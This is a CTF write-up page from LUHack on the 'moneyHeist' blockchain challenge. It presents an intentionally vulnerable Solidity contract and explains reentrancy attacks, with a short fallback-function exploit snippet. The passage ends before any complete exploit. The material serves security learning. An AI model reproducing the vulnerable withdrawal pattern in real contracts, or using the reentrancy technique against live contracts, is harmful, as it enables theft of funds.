@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="KxBie6T6uw1Iexm0-tldr4zEIM4zAUdDLF9N_t97cIE" name="google-site-verification"/>
+<meta content="CTF writeups made by LUHack members." name="description">
+<meta content="moneyHeist" property="og:title"/>
+<meta content="website" property="og:type"/>
+<meta content="../../static/images/logo_small.png" property="og:image"/>
+<meta content="" property="og:url"/>
+<meta content="LUHack" property="og:site_name"/>
+<meta content="CTF writeups made by LUHack members." property="og:description"/>
+<link href="../../static/images/apple-touch-icon-57x57.png" rel="apple-touch-icon-precomposed" sizes="57x57"/>
+<link href="../../static/images/apple-touch-icon-114x114.png" rel="apple-touch-icon-precomposed" sizes="114x114">
+<link href="../../static/images/apple-touch-icon-72x72.png" rel="apple-touch-icon-precomposed" sizes="72x72"/>
+<link href="../../static/images/apple-touch-icon-144x144.png" rel="apple-touch-icon-precomposed" sizes="144x144"/>
+<link href="../../static/images/apple-touch-icon-60x60.png" rel="apple-touch-icon-precomposed" sizes="60x60"/>
+<link href="../../static/images/apple-touch-icon-120x120.png" rel="apple-touch-icon-precomposed" sizes="120x120"/>
+<link href="../../static/images/apple-touch-icon-76x76.png" rel="apple-touch-icon-precomposed" sizes="76x76"/>
+<link href="../../static/images/apple-touch-icon-152x152.png" rel="apple-touch-icon-precomposed" sizes="152x152"/>
+<link href="../../static/images/favicon-196x196.png" rel="icon" sizes="196x196" type="image/png"/>
+<link href="../../static/images/favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+<link href="../../static/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="../../static/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
+<link href="../../static/images/favicon-128.png" rel="icon" sizes="128x128" type="image/png"/>
+<meta content="LUHack" name="application-name"/>
+<meta content="#FFFFFF" name="msapplication-TileColor"/>
+<meta content="../../static/images/mstile-144x144.png" name="msapplication-TileImage"/>
+<meta content="../../static/images/mstile-70x70.png" name="msapplication-square70x70logo"/>
+<meta content="../../static/images/mstile-150x150.png" name="msapplication-square150x150logo"/>
+<meta content="../../static/images/mstile-310x150.png" name="msapplication-wide310x150logo"/>
+<meta content="../../static/images/mstile-310x310.png" name="msapplication-square310x310logo"/>
+<script type="application/ld+json">
+     {
+         "@context": "https://schema.org",
+         "@type": "Article",
+         "author": "incognitojam",
+         "name": "moneyHeist",
+         "about": "Cyber Security",
+         "url": "",
+         "datePublished": "2020-11-25T20:27:45.750511",
+         "dateModified": "2020-11-25T20:27:45.750511",
+         "publsher": {
+             "@type": "Organization",
+             "name": "LUHack"
+         }
+     }
+    </script>
+<title>LUHack Writeup: moneyHeist</title>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/fontawesome.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/solid.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/brands.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/unpkg.com/purecss%402.0.3/build/pure-min.css" rel="stylesheet"/>
+<link href="../../_assets/fonts.googleapis.com/css_81f601ca.css" rel="stylesheet"/>
+<link href="../../static/css/main.css" rel="stylesheet"/>
+<link href="../../static/css/highlight.min.css" rel="stylesheet"/>
+<script defer="" src="../../static/js/base.js"></script>
+</link></meta></head>
+<body>
+<div class="with-sidebar">
+<div class="fill-height">
+<div class="sidebar" id="menu">
+<div class="header">
+<h1 class="brand-title">
+<a class="logo" href="../../index.html">
+<img alt="LUHack logo" src="../../static/images/luhack_logo.png" width="100%"/>
+</a>
+</h1>
+<nav class="nav">
+<ul class="nav-list">
+<li class="nav-item">
+<a class="button" href="../../index.html">Home</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../index.html">Writeups</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../../challenges/index.html">Challenges</a>
+</li>
+<br/>
+<li class="nav-item">
+<a class="button" href="../tags.html">Tag List</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../new.html">New Writeup</a>
+</li>
+</ul>
+</nav>
+<br/>
+<form action="../index.html" class="pure-form" method="GET">
+<input autocomplete="off" class="search-bar" id="search-bar" name="search" placeholder="Search writeups" type="search" value=""/>
+</form>
+<div class="header-content">
+<div class="article-meta">
+<h2>moneyHeist</h2>
+<h4 class="author">By: <a href="../user/incognitojam.html">incognitojam</a></h4>
+<h4 class="date">2020-11-25 20:27:45.750511</h4>
+<div class="tags">
+<a class="post-category" href="../tag/htbctf.html">htbctf</a>
+<a class="post-category" href="../tag/blockchain.html">blockchain</a>
+</div>
+</div>
+</div>
+</div>
+<div class="footer">
+<div class="legal">
+<div class="">
+<a href="#" title="Sign In">Sign In</a>
+</div>
+</div>
+</div>
+</div>
+<div class="not-sidebar">
+<main>
+<h1>moneyHeist</h1>
+<h2>❗️Challenge</h2>
+<div class="highlight"><pre><span></span>The Royal Mint of Spain has just called, all their money's gone.
+It seems to be coming from their new credit card system linked to
+the blockchain. Can you investigate and replicate the exploit?
+They just deployed a test contract for you, steal the ether they
+stored on it!
+</pre></div>
+<p>We are given the source code for a smart contract on the Ethereum blockchain, and the address where it has been deployed. The goal is to empty the balance and then request the flag from the challenge site using the <code>Check Flag</code> button.</p>
+<table>
+<thead>
+<tr>
+<th>Challenge page</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img alt="Top of the challenge page" class="pure-img" src="../../images/43279d7e-00c5-427d-9021-3a8aea1739bf.png"/></td>
+<td><img alt="Bottom of the challenge page" class="pure-img" src="../../images/9193201f-ea41-4315-8fbb-cfb9e4ab331d.png"/></td>
+</tr>
+</tbody>
+</table>
+<p>The contract address: <code>0x396D73A08F112e67dd89245707BbDc00dCFA24F7</code> and the full code snippet is below:</p>
+<div class="highlight"><pre><span></span><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<span class="kt">import</span><span class="w"> </span><span class="s2">"./SafeMath.sol"</span><span class="p">;</span><span class="w"></span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">moneyHeist</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>bankRobberAccount<span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>accountAlreadyExists<span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>hasAlreadyWithdrawn<span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>isAccountActive<span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>inWithdrawalProcess<span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">possibleWithdrawalPerDay</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span>possibleWithdrawalPerDay<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">001</span><span class="w"> </span>ether<span class="p">;</span><span class="w"></span>
+<span class="w">        </span>bankRobberAccount<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">createNewAccount</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>accountAlreadyExists<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">false</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span>hasAlreadyWithdrawn<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span>accountAlreadyExists<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">checkAccountBalance</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">accountAddress</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="kt">public</span><span class="w"></span>
+<span class="w">        </span>view<span class="w"></span>
+<span class="w">        </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">return</span><span class="w"> </span>bankRobberAccount<span class="p">[</span>accountAddress<span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">fundsMovementProcess</span><span class="p">(</span><span class="w"></span>
+<span class="w">        </span><span class="kt">address</span><span class="w"> </span><span class="nv">sourceAddress</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="kt">address</span><span class="w"> </span><span class="nv">destinationAddress</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">transferAmount</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="kt">uint8</span><span class="w"> </span><span class="nv">transferType</span><span class="w"></span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>transferType<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span>bankRobberAccount<span class="p">[</span>destinationAddress<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bankRobberAccount<span class="p">[</span>destinationAddress<span class="p">]</span><span class="w"></span>
+<span class="w">                </span><span class="p">.</span>sub<span class="p">(</span>transferAmount<span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>transferType<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span>bankRobberAccount<span class="p">[</span>destinationAddress<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bankRobberAccount<span class="p">[</span>destinationAddress<span class="p">]</span><span class="w"></span>
+<span class="w">                </span><span class="p">.</span>add<span class="p">(</span>transferAmount<span class="p">);</span><span class="w"></span>
+<span class="w">            </span>bankRobberAccount<span class="p">[</span>sourceAddress<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bankRobberAccount<span class="p">[</span>sourceAddress<span class="p">]</span><span class="w"></span>
+<span class="w">                </span><span class="p">.</span>sub<span class="p">(</span>transferAmount<span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span>revert<span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">transferBetweenAccounts</span><span class="p">(</span><span class="w"></span>
+<span class="w">        </span><span class="kt">address</span><span class="w"> </span><span class="nv">destinationAddress</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">transferAmount</span><span class="w"></span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="w"></span>
+<span class="w">            </span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="w"> </span><span class="err">&amp;&amp;</span><span class="w"></span>
+<span class="w">                </span>isAccountActive<span class="p">[</span>destinationAddress<span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="w"></span>
+<span class="w">        </span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>transferAmount<span class="p">);</span><span class="w"></span>
+<span class="w">        </span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span>fundsMovementProcess<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>destinationAddress<span class="p">,</span><span class="w"> </span>transferAmount<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">2</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">dailyWithdrawalRequest</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">transferAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>transferAmount<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>possibleWithdrawalPerDay<span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>transferAmount<span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>hasAlreadyWithdrawn<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">false</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">isSuccessfulTransfer</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span>transferAmount<span class="p">)(</span><span class="w"></span>
+<span class="w">            </span><span class="s2">""</span><span class="w"></span>
+<span class="w">        </span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>isSuccessfulTransfer<span class="p">);</span><span class="w"></span>
+<span class="w">        </span>fundsMovementProcess<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>transferAmount<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span>hasAlreadyWithdrawn<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">closeBankAccount</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">isSuccessfulTransfer</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span><span class="w"></span>
+<span class="w">            </span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"></span>
+<span class="w">        </span><span class="p">)(</span><span class="s2">""</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>isSuccessfulTransfer<span class="p">);</span><span class="w"></span>
+<span class="w">        </span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>We can find the contract deployed on the <strong>Ropsten testnet</strong> at the address provided using <a href="https://ropsten.etherscan.io/address/0x396d73a08f112e67dd89245707bbdc00dcfa24f7">Etherscan.io</a>. We see that the contract has a balance of <code>0.01 Ether</code>.</p>
+<p><img alt="moneyHeist contract balance is 0.01 Ether" class="pure-img" src="../../images/a0f9b750-54a1-4ed2-8aa3-984814ab479f.png"/></p>
+<h2>🕵️ Research</h2>
+<p>As this was the first blockchain challenge I had attempted, I did some research to try to find some common vulnerabilities in smart contracts. The first Google search result was really helpful documentation for developers on “best practices”.</p>
+<p><img alt="Google search results for smart contract vulnerabilities" class="pure-img" src="../../images/6da817cf-ba3c-40a0-94ec-18b753460c19.png"/></p>
+<p>Here I read about the “reentrancy” attack type, where an attacker can take over the control flow and put the contract in a state the developer never intended. The most simple form of this is “reentrancy on a single function”, where the attacker exploits the contract by recursively calling a function.</p>
+<p>On June 17th 2016, the DAO was hacked and 3.6 million Ether ($50 Million) were stolen using in first reentrancy attack. Both of the major bugs which led to the DAO's collapse were bugs of this type.</p>
+<h3>🔁 Reentrancy attacks</h3>
+<p>When currency is sent to a contract code can be executed, by design. This means that when a smart contract sends currency to another contract, it is <em>calling an external contract</em>. The external contract now has an opportunity to execute its own code before returning control flow back to the original contract.</p>
+<p>Below is an example, taken from ConsenSys, of some vulnerable withdrawal code.</p>
+<div class="highlight"><pre><span></span><span class="c1">// Example smart contract</span>
+<span class="kt">mapping</span><span class="w"> </span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">uint</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>userBalances<span class="p">;</span><span class="w"></span>
+
+<span class="kt">function</span><span class="w"> </span><span class="nv">withdrawBalance</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amountToWithdraw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>userBalances<span class="p">[</span><span class="k">msg.sender</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span>amountToWithdraw<span class="p">)(</span><span class="s2">""</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>success<span class="p">);</span><span class="w"></span>
+<span class="w">    </span>userBalances<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>The <code>withdrawBalance</code> function transfers <code>amountToWithdraw</code> of currency to the user by executing <code>msg.sender.call.value</code> with the amount. Here, control flow is handed over to the user as we can execute whatever code we like when we receive currency. This is by design - contracts can execute their own code when they receive currency by specifying a <code>fallback</code> method.</p>
+<div class="highlight"><pre><span></span><span class="c1">// Contract fallback function</span>
+fallback<span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// code here is executed</span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>The <code>fallback</code> function in a contract is executed when currency is received. We can use this to our advantage to execute <code>withdrawBalance</code> again from within our <code>fallback</code> function, before the <code>userBalances</code> map in the bank contract has been updated to set our balance to zero.</p>
+<div class="highlight"><pre><span></span><span class="c1">// Exploit snippet</span>
+fallback<span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// if the other contract has any money more to send us...</span>
+<span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="p">.</span>balance<span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="c1">// call withdraw again!</span>
+<span class="w">        </span>Bank<span class="p">(</span><span class="k">msg.sender</span><span class="p">).</span>withdrawBalance<span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<h3>🤔 Back to the challenge</h3>
+<p>Looking back to the <code>moneyHeist</code> code we have been given in the challenge, we can start to look for where the reentrancy attack might be possible. We should look for places where <code>msg.sender.call.value</code> is called as this is where we can execute our own code.</p>
+<div class="highlight"><pre><span></span><span class="kt">function</span><span class="w"> </span><span class="nv">dailyWithdrawalRequest</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">transferAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>transferAmount<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>possibleWithdrawalPerDay<span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>transferAmount<span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>hasAlreadyWithdrawn<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">false</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">isSuccessfulTransfer</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span>transferAmount<span class="p">)(</span><span class="w"></span>
+<span class="w">        </span><span class="s2">""</span><span class="w"></span>
+<span class="w">    </span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>isSuccessfulTransfer<span class="p">);</span><span class="w"></span>
+<span class="w">    </span>fundsMovementProcess<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>transferAmount<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span>hasAlreadyWithdrawn<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>The first call we see is in the <code>dailyWithdrawalRequest</code> method. However, we soon notice that this function can't be exploited with re-entrancy because of the later call to <code>fundsMovementProcess</code>.</p>
+<div class="highlight"><pre><span></span><span class="kt">function</span><span class="w"> </span><span class="nv">fundsMovementProcess</span><span class="p">(</span><span class="w"></span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">sourceAddress</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">destinationAddress</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">transferAmount</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="kt">uint8</span><span class="w"> </span><span class="nv">transferType</span><span class="w"></span>
+<span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>inWithdrawalProcess<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;-- this prevents our attack!</span>
+<span class="w">    </span><span class="p">...</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
